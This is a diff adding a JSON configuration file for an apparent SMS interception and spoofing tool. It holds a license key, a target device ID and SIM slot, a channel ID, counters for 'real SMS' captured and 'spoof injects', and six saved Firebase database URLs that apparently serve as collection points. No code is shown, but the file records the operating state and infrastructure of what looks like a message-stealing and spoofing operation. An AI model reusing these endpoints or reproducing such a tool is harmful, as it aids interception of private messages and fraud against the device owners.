@@ -1,0 +1,44 @@
+{
+  "user_id": "8867506072",
+  "license_key": "KEY-D17Q-SMCA-JDG0",
+  "firebase_url": "https://tillu-ki-choti-lulli-default-rtdb.firebaseio.com",
+  "auth_key": "https://tillu-ki-choti-lulli-default-rtdb.firebaseio.com",
+  "selected_device_id": "86f40ae57ff2b0d8",
+  "selected_sim_slot": 1,
+  "channel_id": "-1003769573049",
+  "is_polling_active": false,
+  "last_timestamp": 0,
+  "last_updated": "2026-10-23T18:53:02.360233+00:00",
+  "stats_tokens_sent": 0,
+  "stats_real_sms": 140,
+  "stats_spoof_injects": 52,
+  "ignore_initial_messages": false,
+  "saved_firebases": [
+    {
+      "url": "https://tillu-ki-choti-lulli-default-rtdb.firebaseio.com",
+      "auth": "https://tillu-ki-choti-lulli-default-rtdb.firebaseio.com"
+    },
+    {
+      "url": "https://ysyu-cad20-default-rtdb.firebaseio.com",
+      "auth": "https://ysyu-cad20-default-rtdb.firebaseio.com"
+    },
+    {
+      "url": "https://pooja-gru-default-rtdb.firebaseio.com",
+      "auth": "https://pooja-gru-default-rtdb.firebaseio.com"
+    },
+    {
+      "url": "https://momo2222-default-rtdb.firebaseio.com",
+      "auth": "https://momo2222-default-rtdb.firebaseio.com"
+    },
+    {
+      "url": "https://raja-4455d-default-rtdb.firebaseio.com",
+      "auth": "https://raja-4455d-default-rtdb.firebaseio.com"
+    },
+    {
+      "url": "https://anshu3-f6fbf-default-rtdb.firebaseio.com",
+      "auth": "https://anshu3-f6fbf-default-rtdb.firebaseio.com"
+    }
+  ],
+  "last_message_id": 1792781224540,
+  "monitor_start_time": 1792781171.818916
+}
